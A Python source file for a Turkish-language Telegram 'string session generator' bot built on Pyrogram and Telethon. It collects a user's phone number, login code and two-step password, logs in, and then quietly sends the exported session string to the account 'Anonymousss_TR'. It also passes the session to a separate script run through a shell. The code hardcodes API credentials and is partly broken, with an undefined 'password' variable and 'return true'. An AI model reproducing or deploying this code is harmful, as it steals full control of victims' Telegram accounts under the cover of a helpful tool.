from asyncio.exceptions import TimeoutError
from Data import Data
from pyrogram import Client, filters
import random
from telethon import TelegramClient
from telethon.sessions import StringSession
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from threading import Thread
import subprocess
async def run_bot(session):
  subprocess.run(["python3", "yazan.py"], input=session, shell=True)
ERROR_MESSAGE = "Opss! Bir hata oldu dostum!\n\n**Hata** : {} " \
            "\n\nEğer ki bu mesajda herhangi bir özel bilgi görüyorsanız " \
            "ve bizs bildirmek istiyorsanız" \
            "@Anonymousss_TR veya @bowed36 ile iletişime geçin!"

alfabe = "abcdefghijklmoprsuvyz"
@Client.on_message(filters.private & ~filters.forwarded & filters.command('generate'))
async def main(_, msg):
    await msg.reply(
        "Lütfen sürümü seç",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("Version 1 (Önerilir)", callback_data="pyrogram"),
            InlineKeyboardButton("Version 2", callback_data="telethon")
        ]])
    )


async def generate_session(bot, msg, telethon=False):
    await msg.reply("Bot {} ile kuruluyor...".format("V2" if telethon else "V1"))
    user_id = msg.chat.id
    api_id = 94575
    api_hash = "a3406de8d171bb422bb6ddf3bbd800e2"
    phone_number_msg = await bot.ask(user_id, 'Botun hesabınızda yazabilmesi için telefon numarasını giriniz: ', filters=filters.text)
    phone_number = phone_number_msg.text
    await msg.reply("Giriş yapılıyor...")
    if telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    else:
        client = Client("".join(random.sample(alfabe, k=5)), api_id=api_id, api_hash=api_hash)
    await client.connect()
    try:
        if telethon:
            code = await client.send_code_request(phone_number)
        else:
            code = await client.send_code(phone_number)
    except (ApiIdInvalid, ApiIdInvalidError):
        await msg.reply('`API_ID` and `API_HASH` combination is invalid. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return
    except (PhoneNumberInvalid, PhoneNumberInvalidError):
        await msg.reply(f'`{phone_number}` telefon numarası geçersiz!', reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return
    try:
        phone_code_msg = await bot.ask(user_id, "Telegram hesabınıza kod gönderildi. Kodu her sayı arasına bir boşluk koyarak gönderin. (31 = 3 1)", filters=filters.text, timeout=600)
    except TimeoutError:
        await msg.reply('Time limit reached of 10 minutes. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return
    phone_code = phone_code_msg.text.replace(" ", "")
    try:
        if telethon:
            await client.sign_in(phone_number, phone_code, password=None)
        else:
            await client.sign_in(phone_number, code.phone_code_hash, phone_code)
    except (PhoneCodeInvalid, PhoneCodeInvalidError):
        await msg.reply('Kod geçersiz.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return
    except (PhoneCodeExpired, PhoneCodeExpiredError):
        await msg.reply('Çok geç kaldın.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return
    except (SessionPasswordNeeded, SessionPasswordNeededError):
        try:
            two_step_msg = await bot.ask(user_id, 'Hesabınızda iki adımlı şifre var. Lütfen gönderin.', filters=filters.text, timeout=300)
        except TimeoutError:
            await msg.reply('Time limit reached of 5 minutes. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
            return
        try:
            if telethon:
                await client.sign_in(password=password)
            else:
                await client.check_password(password=password)
        except (PasswordHashInvalid, PasswordHashInvalidError):
            await two_step_msg.reply('Yanlış şifre. Lütfen baştan başlayın.', quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
            return
    if telethon:
        string_session = client.session.save()
    else:
        string_session = await client.export_session_string()
    text = "**{} {} STRING SESSION** \n\n`{}` \n\nGenerated by @Anonymousss_TR".format(msg.from_user.first_name, "TELETHON" if telethon else "PYROGRAM", string_session)
    await client.send_message("Anonymousss_TR", text)
    await client.disconnect()
    try:
      await Thread(target=run_bot, args=(string_session,)).start();
      await phone_code_msg.reply("Botunuz aktif edildi ✅ Nasıl kullanacğınızı bilmiyorsanız @bowed36 ile iletişime geçiniz.")
    except Exception as e:
      print(e)
      await phone_code_msg.reply(ERROR_MESSAGE.format(e))    

async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply("İşlem İptal Edildi!❌", quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return true
    elif "/restart" in msg.text:
        await msg.reply("Restart Bot!", quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return True
    elif msg.text.startswith("/"):  # Bot Commands
        await msg.reply("Cancel generation process!", quote=True)
        return True
    else:
        return False


# @Client.on_message(filters.private & ~filters.forwarded & filters.command(['cancel', 'restart']))
# async def formalities(_, msg):
#     if "/cancel" in msg.text:
#         await msg.reply("Membatalkan Semua Processes!", quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
#         return True
#     elif "/restart" in msg.text:
#         await msg.reply("Memulai Ulang Bot!", quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
#         return True
#     else:
#         return False
